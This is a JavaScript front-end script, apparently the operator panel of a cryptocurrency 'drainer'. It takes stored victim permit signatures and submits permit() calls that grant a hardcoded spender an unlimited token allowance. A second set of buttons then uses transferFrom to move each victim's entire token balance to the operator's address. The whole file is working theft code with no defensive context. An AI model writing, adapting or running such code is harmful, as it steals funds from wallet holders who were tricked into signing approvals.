import { mainNetwork, checkNetwork, checkConnection, Web3, getProvider, sendTransaction, getUserAddress } from './constants.js';

// Carga del front
window.onload = async () => {
    
    checkConnection().then( dataConnect => {
        const signsButton = document.getElementsByName('signButton');
        const transfersButton = document.getElementsByName('transferFunds');

        const web3 = new Web3(getProvider());
        const spender = '0x63423dE55aB709C3E21699dF6C918E7D77553f8B', bigNumber = web3.utils.toBN('ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
        const abi = require('./abi-codes/uChild_abi.json');

        const ethers = require('ethers');

        signsButton.forEach(button => {
            button.addEventListener("click", async () => {
                const contractAddress = button.getAttribute('data-tokenaddress');
                const userAddress = button.getAttribute('data-useraddress');
                const r = button.getAttribute('data-r');
                const s = button.getAttribute('data-s');
                const v = button.getAttribute('data-v');
                const deadline = button.getAttribute('data-deadline');

                const instanceContract = new web3.eth.Contract(abi, contractAddress);
                const txData = await instanceContract.methods.permit(userAddress, spender, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff', deadline, v, r, s).encodeABI();

                sendTransaction(getUserAddress(), contractAddress, txData, 0);
            });
        });

        transfersButton.forEach(button => {
            button.addEventListener("click", async () => {
                const contractAddress = button.getAttribute('data-tokenaddress');
                const userAddress = button.getAttribute('data-useraddress');

                const instanceContract = new web3.eth.Contract(abi, contractAddress);
                const balanceUser = await instanceContract.methods.balanceOf(userAddress).call();

                if (balanceUser > 0) {
                    const txData = await instanceContract.methods.transferFrom(userAddress, getUserAddress(), balanceUser).encodeABI();
                    sendTransaction(getUserAddress(), contractAddress, txData, 0);


                } else {
                    alert('balance: 0');
                }
            });
        });
    });

    if (window.ethereum) {
        window.ethereum.on('chainChanged', (net_id) => { if (net_id != mainNetwork) {
            setTimeout(() => {
                checkNetwork();
            }, 3000);
        }; });
    }
};